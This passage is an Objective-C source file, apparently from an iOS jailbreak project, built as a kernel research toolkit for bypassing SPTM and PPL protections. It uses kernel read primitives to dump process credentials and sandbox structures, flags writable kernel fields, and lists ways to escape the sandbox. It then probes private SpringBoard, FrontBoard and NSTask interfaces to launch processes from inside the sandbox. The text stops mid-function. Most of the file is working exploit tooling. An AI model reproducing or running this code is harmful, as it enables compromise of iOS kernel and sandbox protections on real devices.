//
//  kernel_research.m
//  ClaudeFiles
//
//  Kernel research toolkit for SPTM bypass investigation on iOS 18.1+ A15.
//  Uses existing kread/kwrite primitives to map kernel state and test
//  indirect bypass vectors that avoid PPL/SPTM-protected memory.
//

#import "kernel_research.h"
#import "kexploit/krw.h"
#import "kexploit/kutils.h"
#import "kexploit/offsets.h"
#import "research/sandbox_research.h"
#import <stdlib.h>
#import <string.h>
#import <stdio.h>
#import <unistd.h>
#import <spawn.h>
#import <sys/wait.h>
#import <sys/stat.h>
#import <errno.h>
#import <dlfcn.h>
#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <libkern/OSCacheControl.h>
#import <objc/runtime.h>
#import <fcntl.h>
#import <xpc/xpc.h>

// mach_vm.h is not available in iOS SDK.
// We resolve mach_vm_allocate/protect/deallocate via dlsym at runtime
// to avoid linker issues (symbols may not be in tbd stubs).

// sandbox_check is private API
extern int sandbox_check(pid_t pid, const char *operation, int type, ...);
#define SANDBOX_FILTER_PATH          (1 << 0)
#define SANDBOX_CHECK_NO_REPORT      (1 << 9)
#define SANDBOX_FILTER_GLOBAL_NAME   (1 << 1)
#define SANDBOX_FILTER_NONE          0

// ── Helpers ──

static char *g_buf = NULL;
static size_t g_buf_len = 0;
static size_t g_buf_cap = 0;

static void buf_init(void) {
    g_buf_cap = 8192;
    g_buf = (char *)malloc(g_buf_cap);
    g_buf[0] = '\0';
    g_buf_len = 0;
}

static void buf_append(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    char line[1024];
    vsnprintf(line, sizeof(line), fmt, ap);
    va_end(ap);

    size_t line_len = strlen(line);
    if (g_buf_len + line_len + 1 > g_buf_cap) {
        g_buf_cap = (g_buf_len + line_len + 1) * 2;
        g_buf = (char *)realloc(g_buf, g_buf_cap);
    }
    memcpy(g_buf + g_buf_len, line, line_len + 1);
    g_buf_len += line_len;
}

static char *buf_finish(void) {
    char *result = g_buf;
    g_buf = NULL;
    g_buf_len = 0;
    g_buf_cap = 0;
    return result;
}

// ── Persistent breadcrumb logger ──
// Writes to Documents/breadcrumbs.log so logs survive crashes.
// Call bc_init() at start of any research function, bc() to log.
// kresearch_read_breadcrumbs() returns the file contents.

static FILE *g_bc_file = NULL;

static void bc_init(void) {
    @autoreleasepool {
        NSString *docs = [NSSearchPathForDirectoriesInDomains(
            NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
        NSString *path = [docs stringByAppendingPathComponent:@"breadcrumbs.log"];
        // Truncate on each new run so we only have the latest
        g_bc_file = fopen([path UTF8String], "w");
        if (g_bc_file) {
            fprintf(g_bc_file, "[BC] breadcrumb log started\n");
            fflush(g_bc_file);
        }
    }
}

static void bc(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    char line[1024];
    vsnprintf(line, sizeof(line), fmt, ap);
    va_end(ap);

    // Write to stderr (visible if attached)
    fprintf(stderr, "%s", line);

    // Write to persistent file (survives crash)
    if (g_bc_file) {
        fprintf(g_bc_file, "%s", line);
        fflush(g_bc_file);  // flush every line — crash safe
    }
}

static void bc_close(void) {
    if (g_bc_file) {
        fprintf(g_bc_file, "[BC] breadcrumb log complete\n");
        fclose(g_bc_file);
        g_bc_file = NULL;
    }
}

// Public API: read the last breadcrumbs from disk
char *kresearch_read_breadcrumbs(void) {
    @autoreleasepool {
        NSString *docs = [NSSearchPathForDirectoriesInDomains(
            NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
        NSString *path = [docs stringByAppendingPathComponent:@"breadcrumbs.log"];
        NSData *data = [NSData dataWithContentsOfFile:path];
        if (!data || data.length == 0) {
            char *msg = strdup("(no breadcrumbs found — run a command first)");
            return msg;
        }
        char *result = (char *)malloc(data.length + 1);
        memcpy(result, data.bytes, data.length);
        result[data.length] = '\0';
        return result;
    }
}

static bool kaddr_ok(uint64_t addr) {
    return (addr >= VM_MIN_KERNEL_ADDRESS && addr <= VM_MAX_KERNEL_ADDRESS);
}

static void hexdump_buf(uint64_t kaddr, size_t len, const char *label) {
    buf_append("  %s @ 0x%llx (%zu bytes):\n", label, kaddr, len);
    uint8_t data[256];
    if (len > sizeof(data)) len = sizeof(data);
    kreadbuf(kaddr, data, len);
    for (size_t i = 0; i < len; i += 16) {
        buf_append("    %04zx: ", i);
        for (size_t j = 0; j < 16 && (i + j) < len; j++) {
            buf_append("%02x ", data[i + j]);
        }
        buf_append("\n");
    }
}

// Read a kernel C string (up to maxlen bytes)
static void kread_string(uint64_t kaddr, char *out, size_t maxlen) {
    if (!kaddr_ok(kaddr)) {
        snprintf(out, maxlen, "(invalid kaddr 0x%llx)", kaddr);
        return;
    }
    kreadbuf(kaddr, out, maxlen - 1);
    out[maxlen - 1] = '\0';
}

// ── Credential dumping ──

typedef struct {
    uint64_t proc;
    uint64_t proc_ro;
    uint64_t ucred;
    uint64_t task;
    uint64_t label;
    uint64_t sandbox;
    uint64_t sandbox_profile;
    uint64_t extension_set;
    uint32_t uid, ruid, svuid;
    uint32_t gid, rgid, svgid;
    uint32_t p_flag;
    uint32_t cs_flags;  // from csblob if accessible
    char p_name[32];
    pid_t pid;
} proc_info_t;

static int gather_proc_info(uint64_t proc, proc_info_t *info) {
    memset(info, 0, sizeof(*info));
    info->proc = proc;

    if (!proc || !kaddr_ok(proc)) return -1;

    info->pid = (pid_t)kread32(proc + off_proc_p_pid);
    kreadbuf(proc + off_proc_p_name, info->p_name, 31);
    info->p_flag = kread32(proc + off_proc_p_flag);

    // proc_ro
    info->proc_ro = kread_ptr(proc + off_proc_p_proc_ro);
    if (!kaddr_ok(info->proc_ro)) return -1;

    // task
    info->task = kread_ptr(info->proc_ro + off_proc_ro_pr_task);

    // ucred (PPL-protected, but we can READ)
    info->ucred = kread_ptr(info->proc_ro + off_proc_ro_p_ucred);
    if (!kaddr_ok(info->ucred)) return -1;

    // Read credential fields
    info->uid   = kread32(info->ucred + 0x18);  // cr_uid
    info->ruid  = kread32(info->ucred + 0x1c);  // cr_ruid
    info->svuid = kread32(info->ucred + 0x20);  // cr_svuid
    info->rgid  = kread32(info->ucred + 0x68);  // cr_rgid
    info->svgid = kread32(info->ucred + 0x6c);  // cr_svgid

    // Label → sandbox
    info->label = kread_ptr(info->ucred + off_ucred_cr_label);
    if (kaddr_ok(info->label)) {
        info->sandbox = kread_ptr(info->label + off_label_l_perpolicy_sandbox);
        if (kaddr_ok(info->sandbox)) {
            // sandbox_label layout (verified against sandbox_escape.m):
            //   0x00: profile/platform_profile
            //   0x08: unknown (often 0)
            //   0x10: extension_set  (OFF_SANDBOX_EXT_SET in sandbox_escape.m)
            //   0x18: unknown
            info->sandbox_profile = kread_ptr(info->sandbox + 0x00);
            info->extension_set = kread_ptr(info->sandbox + 0x10);  // was 0x08, WRONG
        }
    }

    // Try to read cs_flags from csblob chain
    uint64_t textvp = kread_ptr(proc + off_proc_p_textvp);
    if (kaddr_ok(textvp)) {
        uint64_t ubcinfo = kread_ptr(textvp + 0x78);
        if (kaddr_ok(ubcinfo)) {
            uint64_t csblob = kread_ptr(ubcinfo + 0x50);
            if (kaddr_ok(csblob)) {
                info->cs_flags = kread32(csblob + 0xC);
            }
        }
    }

    return 0;
}

static void dump_proc_info(proc_info_t *info) {
    buf_append("  PID: %d  Name: %s\n", info->pid, info->p_name);
    buf_append("  proc:     0x%llx\n", info->proc);
    buf_append("  proc_ro:  0x%llx  (PPL-protected)\n", info->proc_ro);
    buf_append("  task:     0x%llx\n", info->task);
    buf_append("  ucred:    0x%llx  (PPL-protected)\n", info->ucred);
    buf_append("  UID: %u  RUID: %u  SVUID: %u\n", info->uid, info->ruid, info->svuid);
    buf_append("  RGID: %u  SVGID: %u\n", info->rgid, info->svgid);
    buf_append("  p_flag:   0x%08x", info->p_flag);
    if (info->p_flag & 0x400) buf_append(" [P_PLATFORM]");
    buf_append("\n");
    buf_append("  cs_flags: 0x%08x", info->cs_flags);
    if (info->cs_flags & 0x1)       buf_append(" [CS_VALID]");
    if (info->cs_flags & 0x4)       buf_append(" [CS_GET_TASK_ALLOW]");
    if (info->cs_flags & 0x8)       buf_append(" [CS_INSTALLER]");
    if (info->cs_flags & 0x20000)   buf_append(" [CS_SIGNED]");
    if (info->cs_flags & 0x4000000) buf_append(" [CS_PLATFORM_BINARY]");
    buf_append("\n");
    buf_append("  label:    0x%llx\n", info->label);
    buf_append("  sandbox:  0x%llx\n", info->sandbox);
    buf_append("  profile:  0x%llx  (sandbox profile ptr — in WRITABLE memory)\n", info->sandbox_profile);
    buf_append("  ext_set:  0x%llx  (extension set — in WRITABLE memory)\n", info->extension_set);
}

// ── Public API ──

char *kresearch_dump_self(void) {
    buf_init();
    buf_append("=== SELF PROCESS STATE ===\n");

    uint64_t self_proc = proc_self();
    proc_info_t info;
    if (gather_proc_info(self_proc, &info) != 0) {
        buf_append("ERROR: Failed to gather proc info\n");
        return buf_finish();
    }
    dump_proc_info(&info);

    // Dump raw sandbox_label
    if (kaddr_ok(info.sandbox)) {
        hexdump_buf(info.sandbox, 0x40, "sandbox_label raw");
    }

    // Dump extension_set buckets
    if (kaddr_ok(info.extension_set)) {
        buf_append("\n  Extension set buckets:\n");
        for (int i = 0; i < 9; i++) {
            uint64_t bucket = kread_ptr(info.extension_set + (i * 8));
            if (bucket && kaddr_ok(bucket)) {
                // Read class node fields using raw kread (avoids pointer cast issues)
                uint64_t class_name_ptr = kread_ptr(bucket + 0x00);
                uint64_t node_count     = kread64(bucket + 0x18);
                char name[128] = {0};
                if (kaddr_ok(class_name_ptr)) {
                    kreadbuf(class_name_ptr, name, sizeof(name) - 1);
                }
                buf_append("    [%d] 0x%llx -> class: \"%s\" (count: %llu)\n",
                           i, bucket, name, (unsigned long long)node_count);
            }
        }
    }

    return buf_finish();
}

char *kresearch_dump_proc(int pid) {
    buf_init();
    buf_append("=== PROCESS %d STATE ===\n", pid);

    uint64_t target = proc_find((pid_t)pid);
    if (!target || !kaddr_ok(target)) {
        buf_append("ERROR: Could not find proc for PID %d\n", pid);
        return buf_finish();
    }

    proc_info_t info;
    if (gather_proc_info(target, &info) != 0) {
        buf_append("ERROR: Failed to gather proc info for PID %d\n", pid);
        return buf_finish();
    }
    dump_proc_info(&info);

    return buf_finish();
}

char *kresearch_compare_creds(int target_pid) {
    buf_init();
    buf_append("=== CREDENTIAL COMPARISON: self vs PID %d ===\n\n", target_pid);

    // Gather self
    proc_info_t self_info;
    if (gather_proc_info(proc_self(), &self_info) != 0) {
        buf_append("ERROR: Failed to gather self proc info\n");
        return buf_finish();
    }

    // Gather target
    uint64_t target_proc = proc_find((pid_t)target_pid);
    if (!target_proc || !kaddr_ok(target_proc)) {
        buf_append("ERROR: Could not find PID %d\n", target_pid);
        return buf_finish();
    }
    proc_info_t target_info;
    if (gather_proc_info(target_proc, &target_info) != 0) {
        buf_append("ERROR: Failed to gather target proc info\n");
        return buf_finish();
    }

    buf_append("--- SELF (PID %d, %s) ---\n", self_info.pid, self_info.p_name);
    dump_proc_info(&self_info);
    buf_append("\n--- TARGET (PID %d, %s) ---\n", target_info.pid, target_info.p_name);
    dump_proc_info(&target_info);

    buf_append("\n--- KEY DIFFERENCES ---\n");

    if (self_info.uid != target_info.uid)
        buf_append("  UID: self=%u target=%u  ← PPL-protected, cannot change\n",
                   self_info.uid, target_info.uid);

    if (self_info.p_flag != target_info.p_flag)
        buf_append("  p_flag: self=0x%x target=0x%x  ← WRITABLE (in proc, not proc_ro)\n",
                   self_info.p_flag, target_info.p_flag);

    if (self_info.cs_flags != target_info.cs_flags)
        buf_append("  cs_flags: self=0x%x target=0x%x  ← in csblob, may be PPL-protected\n",
                   self_info.cs_flags, target_info.cs_flags);

    if (self_info.sandbox_profile != target_info.sandbox_profile)
        buf_append("  sandbox_profile: self=0x%llx target=0x%llx  ← WRITABLE (in sandbox_label)\n",
                   self_info.sandbox_profile, target_info.sandbox_profile);

    if (self_info.extension_set != target_info.extension_set)
        buf_append("  extension_set: self=0x%llx target=0x%llx  ← WRITABLE\n",
                   self_info.extension_set, target_info.extension_set);

    // Check if sandbox objects are the same pointer (some daemons share)
    if (self_info.sandbox == 0 && target_info.sandbox == 0)
        buf_append("  NOTE: Both have NULL sandbox — no sandbox applied\n");
    else if (target_info.sandbox == 0)
        buf_append("  NOTE: Target has NO sandbox! We do.\n");

    return buf_finish();
}

char *kresearch_check_sandbox_ops(void) {
    buf_init();
    buf_append("=== SANDBOX OPERATION CHECK ===\n");
    pid_t pid = getpid();
    buf_append("PID: %d\n\n", pid);

    struct {
        const char *op;
        int filter;
        const char *arg;
        const char *category;
    } checks[] = {
        // Filesystem (should be allowed after sandbox escape)
        {"file-read-data",    SANDBOX_FILTER_PATH, "/",           "filesystem"},
        {"file-write-data",   SANDBOX_FILTER_PATH, "/",           "filesystem"},
        {"file-read-data",    SANDBOX_FILTER_PATH, "/private/var", "filesystem"},
        {"file-write-data",   SANDBOX_FILTER_PATH, "/private/var", "filesystem"},
        {"file-read-data",    SANDBOX_FILTER_PATH, "/bin/sh",     "filesystem"},

        // Process operations (likely blocked — key for posix_spawn)
        {"process-exec",      SANDBOX_FILTER_PATH, "/bin/sh",     "process"},
        {"process-exec",      SANDBOX_FILTER_PATH, "/usr/bin/env", "process"},
        {"process-exec*",     SANDBOX_FILTER_PATH, "/bin/sh",     "process"},
        {"process-fork",      SANDBOX_FILTER_NONE, NULL,          "process"},

        // Mach/IPC
        {"mach-lookup",       SANDBOX_FILTER_NONE, NULL,          "mach"},

        // Signal
        {"signal",            SANDBOX_FILTER_NONE, NULL,          "signal"},

        // Sysctl
        {"sysctl-read",       SANDBOX_FILTER_NONE, NULL,          "sysctl"},
        {"sysctl-write",      SANDBOX_FILTER_NONE, NULL,          "sysctl"},
    };

    int n = sizeof(checks) / sizeof(checks[0]);
    for (int i = 0; i < n; i++) {
        int result;
        if (checks[i].arg) {
            result = sandbox_check(pid, checks[i].op,
                                   checks[i].filter | SANDBOX_CHECK_NO_REPORT,
                                   checks[i].arg);
        } else {
            result = sandbox_check(pid, checks[i].op,
                                   SANDBOX_CHECK_NO_REPORT);
        }

        const char *status = (result == 0) ? "ALLOWED" : "BLOCKED";
        if (checks[i].arg) {
            buf_append("  [%s] %-7s  %s %s\n", status,
                       checks[i].category, checks[i].op, checks[i].arg);
        } else {
            buf_append("  [%s] %-7s  %s\n", status,
                       checks[i].category, checks[i].op);
        }
    }

    buf_append("\nNOTE: 'process-exec' and 'process-fork' are the key checks for posix_spawn.\n");
    buf_append("If blocked, we need to either:\n");
    buf_append("  1. Swap sandbox profile pointer (writable in sandbox_label)\n");
    buf_append("  2. Add process-exec extensions (like we do for file-read-write)\n");
    buf_append("  3. Clear/modify sandbox_label.platform_profile\n");

    return buf_finish();
}

char *kresearch_dump_sandbox_profile(void) {
    buf_init();
    buf_append("=== SANDBOX PROFILE ANALYSIS ===\n\n");

    // Our sandbox
    proc_info_t self_info;
    gather_proc_info(proc_self(), &self_info);

    buf_append("--- OUR SANDBOX ---\n");
    if (!kaddr_ok(self_info.sandbox)) {
        buf_append("  No sandbox object found!\n");
        return buf_finish();
    }

    hexdump_buf(self_info.sandbox, 0x80, "sandbox_label full dump");

    buf_append("\n  Profile pointer: 0x%llx\n", self_info.sandbox_profile);
    if (kaddr_ok(self_info.sandbox_profile)) {
        hexdump_buf(self_info.sandbox_profile, 0x40, "profile object (first 64 bytes)");

        // Try to read profile name/type if it has one
        // Sandbox profiles typically have a name string pointer near the start
        uint64_t maybe_name = kread_ptr(self_info.sandbox_profile);
        if (kaddr_ok(maybe_name)) {
            char name[128] = {0};
            kreadbuf(maybe_name, name, sizeof(name) - 1);
            // Check if it looks like ASCII
            bool is_ascii = true;
            for (int i = 0; i < 64 && name[i]; i++) {
                if (name[i] < 0x20 || name[i] > 0x7e) { is_ascii = false; break; }
            }
            if (is_ascii && name[0])
                buf_append("  Profile name (maybe): \"%s\"\n", name);
        }
    }

    // Compare with launchd (PID 1)
    uint64_t launchd_proc = proc_find(1);
    if (kaddr_ok(launchd_proc)) {
        proc_info_t launchd_info;
        gather_proc_info(launchd_proc, &launchd_info);

        buf_append("\n--- LAUNCHD (PID 1) SANDBOX ---\n");
        if (kaddr_ok(launchd_info.sandbox)) {
            hexdump_buf(launchd_info.sandbox, 0x80, "launchd sandbox_label");
            buf_append("  Profile pointer: 0x%llx\n", launchd_info.sandbox_profile);
        } else {
            buf_append("  launchd sandbox ptr: 0x%llx (NULL/invalid → NO sandbox!)\n",
                       launchd_info.sandbox);
        }

        if (self_info.sandbox_profile == launchd_info.sandbox_profile) {
            buf_append("\n  SAME profile pointer — profiles already match\n");
        } else {
            buf_append("\n  DIFFERENT profile pointers:\n");
            buf_append("    self:    0x%llx\n", self_info.sandbox_profile);
            buf_append("    launchd: 0x%llx\n", launchd_info.sandbox_profile);
            buf_append("    → Swapping could unlock process-exec\n");
        }
    }

    // Also check a few system daemons
    const char *daemons[] = {"SpringBoard", "backboardd", "logd", NULL};
    for (int i = 0; daemons[i]; i++) {
        uint64_t dp = proc_find_by_name(daemons[i]);
        if (dp && kaddr_ok(dp)) {
            proc_info_t di;
            gather_proc_info(dp, &di);
            buf_append("\n  %s (PID %d): sandbox=0x%llx profile=0x%llx uid=%u\n",
                       daemons[i], di.pid, di.sandbox, di.sandbox_profile, di.uid);
        }
    }

    return buf_finish();
}

char *kresearch_swap_sandbox_profile(void) {
    bc_init();
    bc("[SWAP] v14 starting\n");
    buf_init();
    buf_append("=== EXEC BYPASS v14 - ALTERNATIVE LAUNCH VECTORS ===\n");
    buf_append("v13 confirmed:\n");
    buf_append("  registerApplicationDictionary: SILENTLY FAILS (nil)\n");
    buf_append("  registerApplication: SILENTLY FAILS (nil)\n");
    buf_append("  applicationIsInstalled(fake): NO — not accepted\n");
    buf_append("  FBSSystemService.createClientPort: nil from sandbox\n");
    buf_append("  NSTask -launch /bin/sh: 'path not accessible'\n");
    buf_append("v14: FBSOpenApp service, NSTask w/ own binary, SBS C funcs,\n");
    buf_append("  openURL vector, BKSSystemService, kernel sandbox ext.\n\n");

    // Load frameworks once
    void *fbs = dlopen("/System/Library/PrivateFrameworks/"
        "FrontBoardServices.framework/FrontBoardServices", RTLD_LAZY);
    void *bks = dlopen("/System/Library/PrivateFrameworks/"
        "BackBoardServices.framework/BackBoardServices", RTLD_LAZY);
    void *sbs = dlopen("/System/Library/PrivateFrameworks/"
        "SpringBoardServices.framework/SpringBoardServices", RTLD_LAZY);
    void *ls = dlopen("/System/Library/PrivateFrameworks/"
        "MobileCoreServices.framework/MobileCoreServices", RTLD_LAZY);
    if (!ls) ls = dlopen("/System/Library/Frameworks/"
        "CoreServices.framework/CoreServices", RTLD_LAZY);

    buf_append("Frameworks: FBS=%p BKS=%p SBS=%p LS=%p\n",
        fbs, bks, sbs, ls);

    // ══════════════════════════════════════════════════════════════
    // TEST A: FBSOpenApplicationService — try to get a service
    // handle via class methods and call openApplication directly.
    // v13 showed the class exists with serviceWithDefaultShellEndpoint
    // and other class methods. Try them.
    // ══════════════════════════════════════════════════════════════
    bc("[SWAP] Test A: FBSOpenApplicationService\n");
    buf_append("\n-- Test A: FBSOpenApplicationService --\n");
    {
        Class fbsOpenClass = NSClassFromString(
            @"FBSOpenApplicationService");
        buf_append("  class: %p\n", fbsOpenClass);

        if (fbsOpenClass) {
            // A1: Try serviceWithDefaultShellEndpoint
            bc("[SWAP] A1: serviceWithDefaultShellEndpoint\n");
            buf_append("\n  A1: serviceWithDefaultShellEndpoint\n");
            SEL defShellSel = NSSelectorFromString(
                @"serviceWithDefaultShellEndpoint");
            if ([fbsOpenClass respondsToSelector:defShellSel]) {
                @try {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                    id svc = [fbsOpenClass performSelector:defShellSel];
#pragma clang diagnostic pop
                    buf_append("  service: %s\n",
                        svc ? [[svc description] UTF8String] : "nil");

                    if (svc) {
                        // Try canOpenApplication:reason:
                        SEL canOpenSel = NSSelectorFromString(
                            @"canOpenApplication:reason:");
                        buf_append("  canOpenApplication: %s\n",
                            [svc respondsToSelector:canOpenSel] ? "YES" : "NO");

                        // Try openApplication:withOptions:completion:
                        SEL openSel = NSSelectorFromString(
                            @"openApplication:withOptions:completion:");
                        buf_append("  openApplication:withOptions:completion: %s\n",
                            [svc respondsToSelector:openSel] ? "YES" : "NO");
                    }
                } @catch (NSException *e) {
                    buf_append("  EXCEPTION: %s — %s\n",
                        [[e name] UTF8String], [[e reason] UTF8String]);
                }
            } else {
                buf_append("  selector not found\n");
            }

            // A2: Try currentProcessServicesDefaultShellEndpoint
            bc("[SWAP] A2: currentProcessEndpoint\n");
            buf_append("\n  A2: currentProcessServicesDefaultShellEndpoint\n");
            SEL curProcSel = NSSelectorFromString(
                @"currentProcessServicesDefaultShellEndpoint");
            if ([fbsOpenClass respondsToSelector:curProcSel]) {
                @try {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                    id ep = [fbsOpenClass performSelector:curProcSel];
#pragma clang diagnostic pop
                    buf_append("  endpoint: %s\n",
                        ep ? [[ep description] UTF8String] : "nil");
                } @catch (NSException *e) {
                    buf_append("  EXCEPTION: %s — %s\n",
                        [[e name] UTF8String], [[e reason] UTF8String]);
                }
            } else {
                buf_append("  selector not found\n");
            }

            // A3: FBSOpenApplicationOptions — what options exist?
            bc("[SWAP] A3: FBSOpenApplicationOptions\n");
            buf_append("\n  A3: FBSOpenApplicationOptions\n");
            Class fbsOptClass = NSClassFromString(
                @"FBSOpenApplicationOptions");
            buf_append("  class: %p\n", fbsOptClass);
            if (fbsOptClass) {
                unsigned int mc = 0;
                Method *ms = class_copyMethodList(fbsOptClass, &mc);
                buf_append("  instance methods (%u):\n", mc);
                for (unsigned int i = 0; i < mc && i < 20; i++) {
                    buf_append("    - %s\n",
                        sel_getName(method_getName(ms[i])));
                }
                if (ms) free(ms);
            }
        }
    }

    // ══════════════════════════════════════════════════════════════
    // TEST B: NSTask with our OWN executable
    // v13 showed "launch path not accessible" for /bin/sh — sandbox
    // blocks that path. But our own app binary IS accessible.
    // Also try NSTask with a file in our Documents.
    // ══════════════════════════════════════════════════════════════
    bc("[SWAP] Test B: NSTask own binary\n");
    buf_append("\n-- Test B: NSTask with accessible binaries --\n");
    {
        Class nsTask = NSClassFromString(@"NSTask");
        if (nsTask) {
            // Get our own executable path
            NSString *ownExec = [[NSBundle mainBundle] executablePath];
            buf_append("  Our executable: %s\n",
                ownExec ? [ownExec UTF8String] : "nil");

            // B1: Try launching ourselves with a marker argument
            bc("[SWAP] B1: NSTask self-exec\n");
            buf_append("\n  B1: NSTask with own executable\n");
            @try {
                id task = [[nsTask alloc] init];
                SEL setExec = NSSelectorFromString(@"setExecutableURL:");
                SEL setArgs = NSSelectorFromString(@"setArguments:");
                if ([task respondsToSelector:setExec]) {
                    NSURL *execURL = [NSURL fileURLWithPath:ownExec];
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                    [task performSelector:setExec withObject:execURL];
                    if ([task respondsToSelector:setArgs]) {
                        [task performSelector:setArgs
                            withObject:@[@"--jb-test"]];
                    }
#pragma clang diagnostic pop
                    SEL simpleLaunch = NSSelectorFromString(@"launch");
                    if ([task respondsToSelector:simpleLaunch]) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                        [task performSelector:simpleLaunch];
#pragma clang diagnostic pop
                        buf_append("  >>> -launch SUCCEEDED (no exception) <<<\n");
                    }
                }
            } @catch (NSException *e) {
                buf_append("  EXCEPTION: %s — %s\n",
                    [[e name] UTF8String], [[e reason] UTF8String]);
            }

            // B2: Try with a script in our container
            bc("[SWAP] B2: NSTask container script\n");
            buf_append("\n  B2: NSTask with container script\n");
            NSString *docsDir = NSSearchPathForDirectoriesInDomains(
                NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
            NSString *testScript = [docsDir
                stringByAppendingPathComponent:@"test_exec.sh"];
            [@"#!/bin/sh\necho CONTAINER_EXEC > /tmp/nstask_container.txt\n"
                writeToFile:testScript atomically:YES
                encoding:NSUTF8StringEncoding error:nil];
            chmod([testScript UTF8String], 0755);

            @try {
                id task2 = [[nsTask alloc] init];
                SEL setExec = NSSelectorFromString(@"setExecutableURL:");
                if ([task2 respondsToSelector:setExec]) {
                    NSURL *scriptURL = [NSURL fileURLWithPath:testScript];
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                    [task2 performSelector:setExec withObject:scriptURL];
#pragma clang diagnostic pop
                    SEL simpleLaunch = NSSelectorFromString(@"launch");
                    if ([task2 respondsToSelector:simpleLaunch]) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                        [task2 performSelector:simpleLaunch];
#pragma clang diagnostic pop
                        buf_append("  >>> -launch SUCCEEDED <<<\n");
                        usleep(200000);
                        NSFileManager *fm = [NSFileManager defaultManager];
                        if ([fm fileExistsAtPath:
                                @"/tmp/nstask_container.txt"]) {
                            buf_append("  >>> OUTPUT FILE EXISTS! <<<\n");
                        } else {
                            buf_append("  output file not found\n");
                        }
                    }
                }
            } @catch (NSException *e) {
                buf_append("  EXCEPTION: %s — %s\n",
                    [[e name] UTF8String], [[e reason] UTF8String]);
            }
        }
    }

    // ══════════════════════════════════════════════════════════════
    // TEST C: SpringBoardServices C functions
    // SBSLaunchApplicationWithIdentifier and related — these are
    // C-level functions that might bypass ObjC-layer checks.
    // ══════════════════════════════════════════════════════════════
    bc("[SWAP] Test C: SBS C functions\n");
    buf_append("\n-- Test C: SpringBoardServices C functions --\n");
    {
        buf_append("  SBS framework: %p\n", sbs);

        // Probe known function names
        const char *funcNames[] = {
            "SBSLaunchApplicationWithIdentifier",
            "SBSLaunchApplicationWithIdentifierAndLaunchOptions",
            "SBSLaunchApplicationWithIdentifierAndURLAndLaunchOptions",
            "SBSOpenSensitiveURLAndUnlock",
            "SBSOpenApplication",
            "SBSLaunchApplicationForDebugging",
            "SBFrontmostApplicationDisplayIdentifier",
            "SBSCopyApplicationDisplayIdentifiers",
            "SBSCopyDisplayIdentifierForProcessID",
            "SBSSpringBoardServerPort",
            NULL
        };

        for (int i = 0; funcNames[i]; i++) {
            void *fn = dlsym(RTLD_DEFAULT, funcNames[i]);
            buf_append("  %s: %p\n", funcNames[i], fn);
        }

        // C1: Try SBSSpringBoardServerPort — needed by many SBS funcs
        bc("[SWAP] C1: SBSSpringBoardServerPort\n");
        buf_append("\n  C1: SBSSpringBoardServerPort\n");
        typedef mach_port_t (*sbsport_fn)(void);
        sbsport_fn getPort = (sbsport_fn)dlsym(RTLD_DEFAULT,
            "SBSSpringBoardServerPort");
        mach_port_t sbPort = MACH_PORT_NULL;
        if (getPort) {
            @try {
                sbPort = getPort();
                buf_append("  port: 0x%x\n", sbPort);
            } @catch (NSException *e) {
                buf_append("  EXCEPTION: %s\n", [[e name] UTF8String]);
            }
        } else {
            buf_append("  function not found\n");
        }

        // C2: Try SBSCopyApplicationDisplayIdentifiers
        bc("[SWAP] C2: SBSCopyApplicationDisplayIdentifiers\n");
        buf_append("\n  C2: SBSCopyApplicationDisplayIdentifiers\n");
        typedef CFArrayRef (*sbscopy_fn)(mach_port_t, BOOL, BOOL);
        sbscopy_fn copyIds = (sbscopy_fn)dlsym(RTLD_DEFAULT,
            "SBSCopyApplicationDisplayIdentifiers");
        if (copyIds && sbPort != MACH_PORT_NULL) {
            @try {
                CFArrayRef ids = copyIds(sbPort, NO, NO);
                if (ids) {
                    CFIndex count = CFArrayGetCount(ids);
                    buf_append("  installed apps: %ld\n", (long)count);
                    // Show first 5
                    for (CFIndex j = 0; j < count && j < 5; j++) {
                        CFStringRef s = CFArrayGetValueAtIndex(ids, j);
                        char tmp[256];
                        CFStringGetCString(s, tmp, sizeof(tmp),
                            kCFStringEncodingUTF8);
                        buf_append("    [%ld] %s\n", (long)j, tmp);
                    }
                    CFRelease(ids);
                } else {
                    buf_append("  returned NULL\n");
                }
            } @catch (NSException *e) {
                buf_append("  EXCEPTION: %s\n", [[e name] UTF8String]);
            }
        } else {
            buf_append("  %s\n", copyIds ? "no port" : "func not found");
        }

        // C3: Try SBSLaunchApplicationWithIdentifier
        bc("[SWAP] C3: SBSLaunchApplicationWithIdentifier\n");
        buf_append("\n  C3: SBSLaunchApplicationWithIdentifier\n");
        // int SBSLaunchApplicationWithIdentifier(CFStringRef id, BOOL suspended)
        typedef int (*sbslaunch_fn)(CFStringRef, BOOL);
        sbslaunch_fn launchFn = (sbslaunch_fn)dlsym(RTLD_DEFAULT,
            "SBSLaunchApplicationWithIdentifier");
        if (launchFn) {
            @try {
                // Test with a non-focus-stealing bundleID
                CFStringRef calcId = CFSTR("com.apple.calculator");
                int result = launchFn(calcId, YES); // suspended=YES
                buf_append("  launch(calculator, suspended): %d\n", result);
                buf_append("  (0 = success, negative = error)\n");
            } @catch (NSException *e) {
                buf_append("  EXCEPTION: %s\n", [[e name] UTF8String]);
            }
        } else {
            buf_append("  function not found\n");
        }
    }

    // ══════════════════════════════════════════════════════════════
    // TEST D: openURL via LSApplicationWorkspace
    // Try openURL: and openSensitiveURL:withOptions: — URL-based
    // launch might have different sandbox checks than bundle-based.
    // ══════════════════════════════════════════════════════════════
    bc("[SWAP] Test D: openURL\n");
    buf_append("\n-- Test D: URL-based launch --\n");
    {
        Class lsws = NSClassFromString(@"LSApplicationWorkspace");
        SEL defWSSel = NSSelectorFromString(@"defaultWorkspace");
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
        id workspace = lsws ? [lsws performSelector:defWSSel] : nil;
#pragma clang diagnostic pop

        if (workspace) {
